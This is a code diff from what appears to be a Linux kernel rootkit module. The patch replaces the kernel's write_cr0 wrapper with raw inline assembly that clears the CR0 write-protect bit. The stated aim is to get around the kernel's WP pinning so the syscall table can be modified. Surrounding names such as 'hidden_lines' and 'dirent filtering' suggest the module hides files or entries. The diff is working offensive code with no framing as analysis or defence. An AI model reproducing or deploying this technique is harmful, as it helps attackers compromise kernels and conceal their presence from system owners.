@@ -51,12 +51,16 @@ static LIST_HEAD(hidden_lines);
 
 /**
  * @brief Disables CR0 write-protection to allow syscall table modification.
+ *        Uses raw inline asm instead of write_cr0() because since Linux 5.10
+ *        the kernel wrapper actively re-pins the WP bit, making it useless.
  */
 static void disable_write_protect(void)
 {
-    unsigned long cr0 = read_cr0();
+    unsigned long cr0;
 
-    write_cr0(cr0 & ~0x00010000UL);
+    asm volatile("mov %%cr0, %0" : "=r" (cr0));
+    cr0 &= ~0x00010000UL;
+    asm volatile("mov %0, %%cr0" : : "r" (cr0) : "memory");
 }
 
 /**
@@ -64,9 +68,11 @@ static void disable_write_protect(void)
  */
 static void enable_write_protect(void)
 {
-    unsigned long cr0 = read_cr0();
+    unsigned long cr0;
 
-    write_cr0(cr0 | 0x00010000UL);
+    asm volatile("mov %%cr0, %0" : "=r" (cr0));
+    cr0 |= 0x00010000UL;
+    asm volatile("mov %0, %%cr0" : : "r" (cr0) : "memory");
 }
 
 /* ── dirent filtering ── */
